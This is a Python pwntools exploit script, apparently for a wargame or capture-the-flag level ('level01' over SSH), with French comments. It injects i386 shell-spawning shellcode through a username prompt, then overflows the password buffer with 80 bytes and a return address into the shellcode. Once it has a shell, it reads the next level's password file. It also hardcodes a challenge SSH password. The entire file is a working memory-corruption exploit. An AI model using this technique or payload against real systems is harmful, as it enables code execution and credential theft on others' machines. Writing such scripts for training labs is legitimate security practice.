#!/usr/bin/env python3
from pwn import *
import base64
import os

from pwnlib.adb import shell

# Configuration
context.arch = 'i386'  # Architecture du binaire (32-bit)
context.log_level = 'info'  # Niveau de log (debug, info, warning, error)

# Variables pour la connexion
LOCAL = False  # Mettre à False pour l'exploitation SSH
HOST = "localhost"  # Hôte pour SSH
PORT = 8881  # Port pour SSH
USER = "level01"  # Nom d'utilisateur SSH
PASSWORD = "uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL"  # Mot de passe SSH
SSH_SESSION = None


def get_connection(custom_env=None, argv=None):
    global SSH_SESSION
    # Fonction helper pour fusionner les environnements
    def merge_env(base_env, custom_env):
        if custom_env:
            base_env.update(custom_env)
        return base_env

    if LOCAL:
        # En local, on utilise l'environnement actuel comme base
        SSH_SESSION = None
        local_env = os.environ.copy()
        final_env = merge_env(local_env, custom_env)
        final_argv = argv if argv is not None else ['./Resources/' + USER]
        return process(final_argv, env=final_env)
    else:
        shell = ssh(host=HOST, port=PORT, user=USER, password=PASSWORD)
        SSH_SESSION = shell
        # Récupérer l'environnement distant
        remote_env = shell.run('env').recvall().decode().strip()
        # Convertir l'output en dictionnaire
        remote_env_dict = dict(line.split('=', 1) for line in remote_env.split('\n') if '=' in line)

        # Fusionner avec nos variables personnalisées 
        final_env = merge_env(remote_env_dict, custom_env)
        final_argv = argv if argv is not None else ['/home/users/' + USER + '/' + USER]
        log.info(f"Final argv: {final_argv}")
        return shell.process(final_argv, env=final_env)


def exploit():

    shellcode = asm(shellcraft.i386.linux.sh())
    nop_slide = b"\x90"

    payload_username = b"dat_wil" + nop_slide * 10 + shellcode
    payload_password = b"A" * 80 + p32(0x0804a040 + 10)

    print(len(payload_password))

    conn = get_connection()

    if LOCAL:
        gdb.attach(conn, '''
          break *main
          continue
          ''')

    print(conn.recvuntil(b'\n'))
    conn.sendline(payload_username)
    print(payload_username)

    print(conn.recvuntil(b'Enter Password:'))
    conn.sendline(payload_password)
    print(payload_password)

    try:
        if not LOCAL:
            conn.recvuntil(b'$')
            conn.sendline(b'cat /home/users/level02/.pass')
            flag = conn.recvline()
            print("\n=== Flag ===")
            print(flag.decode())
        conn.interactive()

    except EOFError:
        print("EOFError")
        pass
    except Exception as e:
        print(e)
        pass
    finally:
        conn.close()

   
if __name__ == "__main__":
    exploit()


